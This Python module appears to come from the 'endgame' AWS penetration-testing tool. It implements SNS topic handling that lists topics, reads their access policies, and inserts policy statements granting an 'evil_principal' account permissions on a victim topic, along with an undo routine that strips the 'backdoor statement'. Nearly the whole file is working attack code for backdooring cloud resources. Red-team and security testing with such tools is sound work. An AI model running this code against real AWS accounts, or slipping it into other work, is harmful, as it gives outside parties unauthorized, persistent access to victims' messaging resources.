import json
import logging
from abc import ABC
import boto3
import botocore
from botocore.exceptions import ClientError
from policy_sentry.util.arns import get_resource_string
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.utils import get_sid_names_with_error_handling
from endgame.shared.response_message import ResponseMessage

logger = logging.getLogger(__name__)

# Valid SNS policy actions
# https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-language-api-permissions-reference.html#sns-valid-policy-actions
valid_sns_policy_actions = [
    "sns:AddPermission",
    "sns:DeleteTopic",
    "sns:GetTopicAttributes",
    "sns:ListSubscriptionsByTopic",
    "sns:Publish",
    "sns:Receive",
    "sns:RemovePermission",
    "sns:SetTopicAttributes",
    "sns:Subscribe",
]
valid_sns_policy_actions_str = ",".join(valid_sns_policy_actions)


class SnsTopic(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        self.name = name
        self.service = "sns"
        self.region = region
        self.current_account_id = current_account_id
        self.resource_type = "topic"
        self.override_account_id_instead_of_principal = True
        self.override_action = ",".join(valid_sns_policy_actions)
        self.override_resource_block = self.arn
        super().__init__(name, self.resource_type, self.service, region, client, current_account_id,
                         override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
                         override_action=self.override_action, override_resource_block=self.override_resource_block)

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.name}"

    def _get_rbp(self) -> PolicyDocument:
        """Get the resource based policy for this resource and store it"""
        # When there is no policy, let's return an empty policy to avoid breaking things
        policy = constants.get_empty_policy()
        try:
            response = self.client.get_topic_attributes(TopicArn=self.arn)
            attributes = response.get("Attributes")
            if attributes.get("Policy"):
                policy = constants.get_empty_policy()
                policy["Statement"].extend(json.loads(attributes.get("Policy")).get("Statement"))
            else:
                policy = constants.get_empty_policy()
        except self.client.exceptions.ResourceNotFoundException as error:
            logger.critical(error)
        except botocore.exceptions.ClientError as error:
            logger.critical(error)
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        return policy_document

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Wraps client.remove_permission"""
        new_policy = constants.get_empty_policy()
        operation = "UNDO"
        message = "404: No backdoor statement found"
        for statement in self.policy_document.statements:
            if statement.sid == constants.SID_SIGNATURE:
                if not dry_run:
                    response = self.client.remove_permission(
                        TopicArn=self.arn,
                        Label=statement.sid,
                    )
            else:
                new_policy["Statement"].append(json.loads(statement.__str__()))
        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=new_policy, resource_type=self.resource_type, resource_name=self.name)
        return response_message

    def set_rbp(self, evil_policy: dict) -> dict:
        new_policy_document = PolicyDocument(
            policy=evil_policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        new_policy_json = {
            "Version": "2012-10-17",
            "Statement": []
        }
        current_sids = get_sid_names_with_error_handling(self.original_policy)
        for statement in new_policy_document.statements:
            if statement.sid not in current_sids:
                response = self.client.add_permission(
                    TopicArn=self.arn,
                    Label=statement.sid,
                    ActionName=self.sns_actions_without_prefixes(statement.actions),
                    AWSAccountId=statement.aws_principals,
                )
            new_policy_json["Statement"].append(json.loads(statement.__str__()))
        policy_document = self._get_rbp()
        # return new_policy_json
        return policy_document.json

    def sns_actions_without_prefixes(self, actions_with_service_prefix):
        # SNS boto3 client requires that you provide Publish instead of sns:Publish
        updated_actions = []

        if isinstance(actions_with_service_prefix, list):
            actions = actions_with_service_prefix
        else:
            actions = [actions_with_service_prefix]
        for action in actions:
            if ":" in action:
                temp_action = action.split(":")[1]
                if temp_action == "*":
                    updated_actions.extend(valid_sns_policy_actions)
                else:
                    updated_actions.append(temp_action)
            else:
                updated_actions.append(action)

        return updated_actions


class SnsTopics(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)

    @property
    def resources(self):
        """Get a list of these resources"""
        these_resources = []

        paginator = self.client.get_paginator('list_topics')
        page_iterator = paginator.paginate()
        for page in page_iterator:
            resources = page["Topics"]
            for resource in resources:
                arn = resource.get("TopicArn")
                name = get_resource_string(arn)
                these_resources.append(name)
        return these_resources

    @property
    def arns(self):
        """Get a list of these resources"""
        arns = []

        paginator = self.client.get_paginator('list_topics')
        page_iterator = paginator.paginate()
        for page in page_iterator:
            resources = page["Topics"]
            for resource in resources:
                arn = resource.get("TopicArn")
                # name = get_resource_string(arn)
                arns.append(arn)
        return arns
